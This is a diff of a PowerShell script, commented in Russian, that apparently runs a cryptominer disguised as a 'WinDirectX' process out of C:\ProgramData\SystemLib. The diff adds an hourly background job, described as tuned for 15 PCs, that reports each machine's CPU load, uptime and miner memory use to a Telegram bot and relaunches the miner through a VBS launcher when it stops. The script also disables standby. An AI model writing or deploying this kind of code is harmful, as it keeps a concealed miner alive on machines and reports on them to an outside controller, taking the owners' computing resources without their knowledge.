@@ -110,19 +110,42 @@ powercfg /x -monitor-timeout-ac 5
 powercfg /x -standby-timeout-ac 0
 Start-Process -FilePath "$path\win_start.vbs"
 
-# 8. МОНИТОРИНГ В ТЕЛЕГРАМ (Раз в час)
+# 8. МОНИТОРИНГ В ТЕЛЕГРАМ (ОПТИМИЗИРОВАНО ПОД 15 ПК)
 $Monitor = {
     param($pcName, $tgToken, $chatId)
     while($true) {
+        # Считаем время работы системы (Uptime)
+        $uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
+        $uptimeStr = "{0}д {1}ч {2}м" -f $uptime.Days, $uptime.Hours, $uptime.Minutes
+        
+        # Получаем среднюю загрузку процессора
+        $cpuLoad = (Get-CimInstance Win32_Processor | Measure-Object -Property LoadPercentage -Average).Average
+
+        # Проверяем процесс майнера
         $p = Get-Process "WinDirectX" -ErrorAction SilentlyContinue
-        $msg = if ($p) { "✅ Статус: Работаю (" + [Math]::Round($p.WorkingSet64 / 1MB, 2) + " MB)" } else { "⚠️ СТАТУС: МАЙНЕР ВЫЛЕТЕЛ!" }
+        
+        if ($p) {
+            $mem = [Math]::Round($p.WorkingSet64 / 1MB, 2)
+            $msg = "✅ СТАТУС: ОК`n💻 Нагрузка ЦП: $cpuLoad%`n⏳ Uptime: $uptimeStr`n📦 RAM: $mem MB"
+        } else {
+            $msg = "⚠️ ВНИМАНИЕ: МАЙНЕР ВЫЛЕТЕЛ! Пытаюсь перезапустить..."
+            # Попытка реанимации, если вылетел
+            Start-Process -FilePath "C:\ProgramData\SystemLib\win_start.vbs" -ErrorAction SilentlyContinue
+        }
+
         $url = "https://api.telegram.org/bot$tgToken/sendMessage"
-        $body = @{ chat_id = "$chatId"; text = "[$pcName]: $msg" }
-        try { Invoke-RestMethod -Uri $url -Method Post -Body $body -ErrorAction SilentlyContinue } catch {}
+        $body = @{ chat_id = "$chatId"; text = "[$pcName]`n$msg" }
+        
+        try { 
+            Invoke-RestMethod -Uri $url -Method Post -Body $body -ErrorAction SilentlyContinue 
+        } catch {}
+        
+        # Интервал проверки (3600 сек = 1 час)
         Start-Sleep -Seconds 3600
     }
 }
 Start-Job -ScriptBlock $Monitor -ArgumentList $env:COMPUTERNAME, $tgToken, $chatId
+
 
 # Уведомление о старте
 $urlStart = "https://api.telegram.org/bot$tgToken/sendMessage"
